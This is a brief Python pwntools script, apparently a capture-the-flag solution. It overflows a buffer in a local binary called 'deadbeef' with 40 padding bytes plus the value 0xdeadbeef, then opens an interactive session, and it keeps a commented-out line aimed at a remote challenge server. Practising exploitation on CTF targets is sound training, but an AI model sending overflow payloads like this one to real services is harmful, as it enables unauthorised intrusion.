from pwn import *

p = process('./bin/deadbeef')
# p = remote('nc 35.178.30.161', 1341)

payload = b'a'*40
payload += p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
